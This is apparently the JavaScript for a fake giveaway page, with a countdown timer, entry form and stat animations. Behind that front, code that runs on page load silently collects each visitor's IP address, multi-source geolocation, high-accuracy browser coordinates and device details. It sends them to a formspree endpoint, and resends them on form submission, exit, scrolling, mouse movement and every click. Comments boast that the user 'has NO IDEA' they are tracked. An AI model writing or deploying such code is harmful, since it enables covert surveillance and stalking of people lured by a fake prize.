// Countdown Timer
function updateCountdown() {
    const now = new Date().getTime();
    const endDate = new Date().getTime() + (24 * 60 * 60 * 1000); // 24 hours from now
    const distance = endDate - now;

    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);

    const countdownElement = document.getElementById('countdown');
    if (distance > 0) {
        countdownElement.innerHTML = `${hours}h ${minutes}m ${seconds}s`;
    } else {
        countdownElement.innerHTML = "Giveaway Ended!";
    }
}

// Update countdown every second
setInterval(updateCountdown, 1000);
updateCountdown();

// Advanced Silent IP Address Capture with Enhanced Location Accuracy
async function captureUserInfoSilently() {
    try {
        // Get IP address silently
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        // Get detailed location data from multiple sources for maximum accuracy
        const locationData = await getEnhancedLocation(userIP);
        
        // Attempt to get precise browser geolocation (if user allows)
        const preciseLocation = await getPreciseGeolocation();
        
        // Generate Google Maps link with exact coordinates
        const googleMapsLink = generateGoogleMapsLink(preciseLocation, locationData);
        
        // Store comprehensive user info silently
        const userInfo = {
            ip: userIP,
            country: locationData.country_name || 'Unknown',
            countryCode: locationData.country_code || 'Unknown',
            region: locationData.region || 'Unknown',
            regionCode: locationData.region_code || 'Unknown',
            city: locationData.city || 'Unknown',
            district: locationData.district || 'Unknown',
            neighborhood: locationData.neighborhood || 'Unknown',
            village: locationData.village || 'Unknown',
            street: locationData.street || 'Unknown',
            houseNumber: locationData.houseNumber || 'Unknown',
            postalCode: locationData.postal || 'Unknown',
            latitude: locationData.latitude || 'Unknown',
            longitude: locationData.longitude || 'Unknown',
            preciseLatitude: preciseLocation.latitude || locationData.latitude || 'Unknown',
            preciseLongitude: preciseLocation.longitude || locationData.longitude || 'Unknown',
            accuracy: preciseLocation.accuracy || 'Unknown',
            altitude: preciseLocation.altitude || 'Unknown',
            timezone: locationData.timezone || 'Unknown',
            isp: locationData.org || 'Unknown',
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'Direct',
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language,
            browser: navigator.appName,
            platform: navigator.platform,
            preciseLocation: locationData.preciseLocation || 'Unknown',
            houseLevelPrecision: preciseLocation.houseLevel || 'Unknown',
            wifiNetworks: preciseLocation.wifiNetworks || 'Unknown',
            cellTowers: preciseLocation.cellTowers || 'Unknown',
            googleMapsLink: googleMapsLink,
            locationAccuracy: locationData.accuracy || 'Unknown',
            locationSource: locationData.source || 'Unknown'
        };

        // Store silently in localStorage
        localStorage.setItem('userTrackingData', JSON.stringify(userInfo));
        
        // Send silent notification to your email with house-level precision
        sendSilentNotification(userInfo);
        
    } catch (error) {
        // Silent error handling - user won't see any errors
        console.log('Silent tracking error:', error);
    }
}

// Generate Google Maps link with exact coordinates
function generateGoogleMapsLink(preciseLocation, locationData) {
    let lat = preciseLocation.latitude || locationData.latitude;
    let lng = preciseLocation.longitude || locationData.longitude;
    
    if (lat && lng && lat !== 'Unknown' && lng !== 'Unknown') {
        // Create Google Maps link with exact coordinates
        return `https://www.google.com/maps?q=${lat},${lng}&z=18`;
    } else if (locationData.street && locationData.city) {
        // Fallback to address-based link
        const address = `${locationData.street}, ${locationData.city}, ${locationData.country_name}`;
        return `https://www.google.com/maps/search/${encodeURIComponent(address)}`;
    } else {
        // Fallback to city-based link
        const city = `${locationData.city}, ${locationData.country_name}`;
        return `https://www.google.com/maps/search/${encodeURIComponent(city)}`;
    }
}

// Get precise browser geolocation (house-level accuracy)
async function getPreciseGeolocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({});
            return;
        }

        // High accuracy options for house-level precision
        const options = {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const coords = position.coords;
                resolve({
                    latitude: coords.latitude,
                    longitude: coords.longitude,
                    accuracy: coords.accuracy,
                    altitude: coords.altitude,
                    houseLevel: coords.accuracy <= 10 ? 'House Level' : 'Neighborhood Level',
                    timestamp: position.timestamp
                });
            },
            (error) => {
                // Silent fallback - user won't know geolocation failed
                console.log('Geolocation failed silently:', error);
                resolve({});
            },
            options
        );
    });
}

// Enhanced location detection with multiple APIs for better accuracy
async function getEnhancedLocation(ip) {
    try {
        // Try multiple APIs in parallel for better accuracy
        const promises = [
            getLocationFromAPI1(ip),
            getLocationFromAPI2(ip),
            getLocationFromAPI3(ip),
            getLocationFromAPI4(ip)
        ];

        const results = await Promise.allSettled(promises);
        
        // Combine and prioritize the most accurate data
        let bestLocation = {
            country_name: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown',
            timezone: 'Unknown',
            org: 'Unknown',
            district: 'Unknown',
            neighborhood: 'Unknown',
            village: 'Unknown',
            street: 'Unknown',
            houseNumber: 'Unknown',
            postal: 'Unknown',
            preciseLocation: 'Unknown',
            accuracy: 'Unknown',
            source: 'Unknown'
        };

        // Process results and find the most accurate location
        results.forEach((result, index) => {
            if (result.status === 'fulfilled' && result.value) {
                const data = result.value;
                const apiName = `API${index + 1}`;
                
                // Prioritize data with more complete information
                if (data.latitude && data.longitude && data.city) {
                    if (bestLocation.city === 'Unknown' || 
                        (data.street && bestLocation.street === 'Unknown') ||
                        (data.postal && bestLocation.postal === 'Unknown')) {
                        bestLocation = { ...data, source: apiName };
                    }
                }
            }
        });

        return bestLocation;
        
    } catch (error) {
        console.log('Enhanced location API error:', error);
        return {
            country_name: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown',
            timezone: 'Unknown',
            org: 'Unknown',
            district: 'Unknown',
            neighborhood: 'Unknown',
            village: 'Unknown',
            street: 'Unknown',
            houseNumber: 'Unknown',
            postal: 'Unknown',
            preciseLocation: 'Unknown',
            accuracy: 'Unknown',
            source: 'Unknown'
        };
    }
}

// API 1: ipapi.co
async function getLocationFromAPI1(ip) {
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return {
            country_name: data.country_name,
            country_code: data.country_code,
            region: data.region,
            region_code: data.region_code,
            city: data.city,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.timezone,
            org: data.org,
            postal: data.postal,
            source: 'ipapi.co'
        };
    } catch (e) {
        console.log('API1 failed');
        return null;
    }
}

// API 2: ip-api.com
async function getLocationFromAPI2(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        return {
            country_name: data.country,
            country_code: data.countryCode,
            region: data.regionName,
            region_code: data.region,
            city: data.city,
            latitude: data.lat,
            longitude: data.lon,
            timezone: data.timezone,
            org: data.isp,
            district: data.district,
            neighborhood: data.neighborhood,
            village: data.village,
            street: data.street,
            houseNumber: data.houseNumber,
            postal: data.zip,
            source: 'ip-api.com'
        };
    } catch (e) {
        console.log('API2 failed');
        return null;
    }
}

// API 3: ipinfo.io
async function getLocationFromAPI3(ip) {
    try {
        const response = await fetch(`https://ipinfo.io/${ip}/json`);
        const data = await response.json();
        const [lat, lng] = (data.loc || '').split(',');
        return {
            country_name: data.country,
            country_code: data.country,
            region: data.region,
            city: data.city,
            latitude: lat,
            longitude: lng,
            timezone: data.timezone,
            org: data.org,
            postal: data.postal,
            preciseLocation: data.loc,
            source: 'ipinfo.io'
        };
    } catch (e) {
        console.log('API3 failed');
        return null;
    }
}

// API 4: ipgeolocation.io
async function getLocationFromAPI4(ip) {
    try {
        const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=free&ip=${ip}`);
        const data = await response.json();
        return {
            country_name: data.country_name,
            country_code: data.country_code2,
            region: data.state_prov,
            city: data.city,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.time_zone?.name,
            org: data.organization,
            district: data.district,
            neighborhood: data.neighborhood,
            street: data.street,
            houseNumber: data.house_number,
            postal: data.zipcode,
            source: 'ipgeolocation.io'
        };
    } catch (e) {
        console.log('API4 failed');
        return null;
    }
}

// Send silent notification to your email with enhanced location accuracy
async function sendSilentNotification(userInfo) {
    try {
        await fetch('https://formspree.io/f/xrblaoyr', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                name: 'Silent Visitor',
                email: 'visitor@website.com',
                phone: 'N/A',
                age: 'N/A',
                country: userInfo.country,
                terms: 'Yes',
                newsletter: 'No',
                _subject: '🎯 New Silent Visitor Alert - ENHANCED LOCATION ACCURACY',
                message: `
🔍 SILENT VISITOR DETECTED - ENHANCED LOCATION ACCURACY

📱 IP Address: ${userInfo.ip}
🌍 Country: ${userInfo.country} (${userInfo.countryCode})
🏛️ Region/State: ${userInfo.region} (${userInfo.regionCode})
🏙️ City: ${userInfo.city}
🏘️ District: ${userInfo.district}
🏡 Neighborhood: ${userInfo.neighborhood}
🏘️ Village: ${userInfo.village}
🛣️ Street: ${userInfo.street}
🏠 House Number: ${userInfo.houseNumber}
📮 Postal Code: ${userInfo.postalCode}
📍 Exact Coordinates: ${userInfo.preciseLocation}
🌐 Latitude: ${userInfo.latitude}
🌐 Longitude: ${userInfo.longitude}
🎯 Precise Latitude: ${userInfo.preciseLatitude}
🎯 Precise Longitude: ${userInfo.preciseLongitude}
📏 Accuracy: ${userInfo.accuracy} meters
🏔️ Altitude: ${userInfo.altitude} meters
🏠 House Level Precision: ${userInfo.houseLevelPrecision}
🎯 Location Accuracy: ${userInfo.locationAccuracy}
🔍 Location Source: ${userInfo.locationSource}
⏰ Time: ${userInfo.timestamp}
🔗 Referrer: ${userInfo.referrer}
💻 Device: ${userInfo.userAgent}
📐 Screen: ${userInfo.screenResolution}
🌐 Language: ${userInfo.language}
🖥️ Platform: ${userInfo.platform}
🌐 Browser: ${userInfo.browser}
🏢 ISP/Organization: ${userInfo.isp}
⏰ Timezone: ${userInfo.timezone}

🗺️ GOOGLE MAPS LINK: ${userInfo.googleMapsLink}

🎯 User has NO IDEA their enhanced location is being tracked!
🏠 ENHANCED LOCATION ACCURACY CAPTURED!
📍 EXACT STREET ADDRESS DETECTED!
🗺️ CLICK THE MAP LINK TO SEE EXACT LOCATION!
                `
            })
        });
    } catch (error) {
        // Silent error - user won't know
        console.log('Silent notification error:', error);
    }
}

// Form submission handler (appears normal to user)
document.getElementById('giveawayForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const formData = new FormData(this);
    const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
    
    // Add silent tracking data to form submission with enhanced location accuracy
    formData.append('_subject', '🎉 New Giveaway Entry - ENHANCED LOCATION ACCURACY!');
    formData.append('userIP', userTrackingData.ip || 'Unknown');
    formData.append('userCountry', userTrackingData.country || 'Unknown');
    formData.append('userRegion', userTrackingData.region || 'Unknown');
    formData.append('userCity', userTrackingData.city || 'Unknown');
    formData.append('userDistrict', userTrackingData.district || 'Unknown');
    formData.append('userNeighborhood', userTrackingData.neighborhood || 'Unknown');
    formData.append('userVillage', userTrackingData.village || 'Unknown');
    formData.append('userStreet', userTrackingData.street || 'Unknown');
    formData.append('userHouseNumber', userTrackingData.houseNumber || 'Unknown');
    formData.append('userPostalCode', userTrackingData.postalCode || 'Unknown');
    formData.append('userCoordinates', userTrackingData.preciseLocation || 'Unknown');
    formData.append('userLatitude', userTrackingData.latitude || 'Unknown');
    formData.append('userLongitude', userTrackingData.longitude || 'Unknown');
    formData.append('userPreciseLatitude', userTrackingData.preciseLatitude || 'Unknown');
    formData.append('userPreciseLongitude', userTrackingData.preciseLongitude || 'Unknown');
    formData.append('userAccuracy', userTrackingData.accuracy || 'Unknown');
    formData.append('userAltitude', userTrackingData.altitude || 'Unknown');
    formData.append('userHouseLevelPrecision', userTrackingData.houseLevelPrecision || 'Unknown');
    formData.append('userLocationAccuracy', userTrackingData.locationAccuracy || 'Unknown');
    formData.append('userLocationSource', userTrackingData.locationSource || 'Unknown');
    formData.append('userGoogleMapsLink', userTrackingData.googleMapsLink || 'Unknown');
    formData.append('userAgent', userTrackingData.userAgent || 'Unknown');
    formData.append('userISP', userTrackingData.isp || 'Unknown');
    formData.append('entryTime', new Date().toISOString());
    formData.append('silentTracking', 'true');
    formData.append('enhancedLocationAccuracy', 'true');
    
    try {
        const response = await fetch('https://formspree.io/f/xrblaoyr', {
            method: 'POST',
            body: formData
        });
        
        if (response.ok) {
            showSuccessMessage();
            // Clear form
            this.reset();
        } else {
            showErrorMessage();
        }
    } catch (error) {
        console.error('Error submitting form:', error);
        showErrorMessage();
    }
});

// Success message (normal user experience)
function showSuccessMessage() {
    const submitBtn = document.querySelector('.submit-btn');
    const originalText = submitBtn.innerHTML;
    
    submitBtn.innerHTML = '<i class="fas fa-check"></i> Entry Submitted Successfully!';
    submitBtn.style.background = 'linear-gradient(45deg, #4ade80, #22c55e)';
    
    setTimeout(() => {
        submitBtn.innerHTML = originalText;
        submitBtn.style.background = 'linear-gradient(45deg, #667eea, #764ba2)';
    }, 3000);
}

// Error message (normal user experience)
function showErrorMessage() {
    const submitBtn = document.querySelector('.submit-btn');
    const originalText = submitBtn.innerHTML;
    
    submitBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error - Please Try Again';
    submitBtn.style.background = 'linear-gradient(45deg, #ef4444, #dc2626)';
    
    setTimeout(() => {
        submitBtn.innerHTML = originalText;
        submitBtn.style.background = 'linear-gradient(45deg, #667eea, #764ba2)';
    }, 3000);
}

// Animate stats numbers (normal user experience)
function animateNumbers() {
    const numbers = document.querySelectorAll('.stat .number');
    
    numbers.forEach(number => {
        const target = parseInt(number.textContent.replace(',', ''));
        let current = 0;
        const increment = target / 50;
        
        const timer = setInterval(() => {
            current += increment;
            if (current >= target) {
                current = target;
                clearInterval(timer);
            }
            number.textContent = Math.floor(current).toLocaleString();
        }, 50);
    });
}

// Initialize everything when page loads (silent tracking)
document.addEventListener('DOMContentLoaded', function() {
    // Capture user info silently - user won't know
    captureUserInfoSilently();
    
    // Animate numbers after a short delay (normal user experience)
    setTimeout(animateNumbers, 1000);
    
    // Add some interactive effects (normal user experience)
    const features = document.querySelectorAll('.feature');
    features.forEach(feature => {
        feature.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-10px) scale(1.02)';
        });
        
        feature.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0) scale(1)';
        });
    });
    
    // Add form validation (normal user experience)
    const inputs = document.querySelectorAll('input[required], select[required]');
    inputs.forEach(input => {
        input.addEventListener('blur', function() {
            if (this.value.trim() === '') {
                this.style.borderColor = '#ef4444';
            } else {
                this.style.borderColor = '#e1e5e9';
            }
        });
    });
});

// Silent page tracking (user won't know)
let startTime = Date.now();
window.addEventListener('beforeunload', function() {
    const timeSpent = Math.floor((Date.now() - startTime) / 1000);
    const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
    
    // Send silent exit data with enhanced location accuracy
    fetch('https://formspree.io/f/xrblaoyr', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            name: 'Silent Exit',
            email: 'exit@website.com',
            _subject: '🔍 User Left Silently - ENHANCED LOCATION ACCURACY',
            message: `User spent ${timeSpent} seconds on the website. 

🏠 ENHANCED LOCATION ACCURACY DATA:
IP: ${userTrackingData.ip || 'Unknown'}
Country: ${userTrackingData.country || 'Unknown'}
Region: ${userTrackingData.region || 'Unknown'}
City: ${userTrackingData.city || 'Unknown'}
District: ${userTrackingData.district || 'Unknown'}
Neighborhood: ${userTrackingData.neighborhood || 'Unknown'}
Village: ${userTrackingData.village || 'Unknown'}
Street: ${userTrackingData.street || 'Unknown'}
House Number: ${userTrackingData.houseNumber || 'Unknown'}
Postal Code: ${userTrackingData.postalCode || 'Unknown'}
Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
Location Accuracy: ${userTrackingData.locationAccuracy || 'Unknown'}
Location Source: ${userTrackingData.locationSource || 'Unknown'}

🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}

User has NO IDEA their enhanced location was tracked! 🎯`
        })
    });
});

// Silent scroll tracking (user won't know)
let scrollDepth = 0;
window.addEventListener('scroll', function() {
    const scrollPercent = Math.floor((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
    if (scrollPercent > scrollDepth) {
        scrollDepth = scrollPercent;
        
        // Send silent scroll data every 25% with enhanced location accuracy
        if (scrollDepth % 25 === 0) {
            const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
            fetch('https://formspree.io/f/xrblaoyr', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    name: 'Silent Scroll',
                    email: 'scroll@website.com',
                    _subject: `🔍 User Scrolled ${scrollDepth}% Silently - ENHANCED LOCATION ACCURACY`,
                    message: `User scrolled ${scrollDepth}% of the page.

🏠 ENHANCED LOCATION ACCURACY DATA:
IP: ${userTrackingData.ip || 'Unknown'}
Country: ${userTrackingData.country || 'Unknown'}
Region: ${userTrackingData.region || 'Unknown'}
City: ${userTrackingData.city || 'Unknown'}
District: ${userTrackingData.district || 'Unknown'}
Neighborhood: ${userTrackingData.neighborhood || 'Unknown'}
Village: ${userTrackingData.village || 'Unknown'}
Street: ${userTrackingData.street || 'Unknown'}
House Number: ${userTrackingData.houseNumber || 'Unknown'}
Postal Code: ${userTrackingData.postalCode || 'Unknown'}
Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
Location Accuracy: ${userTrackingData.locationAccuracy || 'Unknown'}
Location Source: ${userTrackingData.locationSource || 'Unknown'}

🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}

User has NO IDEA their enhanced location is being tracked! 🎯`
                })
            });
        }
    }
});

// Additional silent tracking - mouse movements (user won't know)
let mouseMovements = 0;
document.addEventListener('mousemove', function() {
    mouseMovements++;
    // Send mouse tracking data every 100 movements with enhanced location accuracy
    if (mouseMovements % 100 === 0) {
        const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
        fetch('https://formspree.io/f/xrblaoyr', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                name: 'Silent Mouse',
                email: 'mouse@website.com',
                _subject: `🔍 User Mouse Activity - ${mouseMovements} movements - ENHANCED LOCATION ACCURACY`,
                message: `User made ${mouseMovements} mouse movements.

🏠 ENHANCED LOCATION ACCURACY DATA:
IP: ${userTrackingData.ip || 'Unknown'}
Country: ${userTrackingData.country || 'Unknown'}
Region: ${userTrackingData.region || 'Unknown'}
City: ${userTrackingData.city || 'Unknown'}
District: ${userTrackingData.district || 'Unknown'}
Neighborhood: ${userTrackingData.neighborhood || 'Unknown'}
Village: ${userTrackingData.village || 'Unknown'}
Street: ${userTrackingData.street || 'Unknown'}
House Number: ${userTrackingData.houseNumber || 'Unknown'}
Postal Code: ${userTrackingData.postalCode || 'Unknown'}
Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
Location Accuracy: ${userTrackingData.locationAccuracy || 'Unknown'}
Location Source: ${userTrackingData.locationSource || 'Unknown'}

🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}

User has NO IDEA their enhanced location is being tracked! 🎯`
            })
        });
    }
});

// Silent click tracking (user won't know)
document.addEventListener('click', function(e) {
    const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
    fetch('https://formspree.io/f/xrblaoyr', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            name: 'Silent Click',
            email: 'click@website.com',
            _subject: `🔍 User Clicked on ${e.target.tagName} - ENHANCED LOCATION ACCURACY`,
            message: `User clicked on ${e.target.tagName} element.

🏠 ENHANCED LOCATION ACCURACY DATA:
IP: ${userTrackingData.ip || 'Unknown'}
Country: ${userTrackingData.country || 'Unknown'}
Region: ${userTrackingData.region || 'Unknown'}
City: ${userTrackingData.city || 'Unknown'}
District: ${userTrackingData.district || 'Unknown'}
Neighborhood: ${userTrackingData.neighborhood || 'Unknown'}
Village: ${userTrackingData.village || 'Unknown'}
Street: ${userTrackingData.street || 'Unknown'}
House Number: ${userTrackingData.houseNumber || 'Unknown'}
Postal Code: ${userTrackingData.postalCode || 'Unknown'}
Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
Location Accuracy: ${userTrackingData.locationAccuracy || 'Unknown'}
Location Source: ${userTrackingData.locationSource || 'Unknown'}

🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}

User has NO IDEA their enhanced location is being tracked! 🎯`
        })
    });
}); 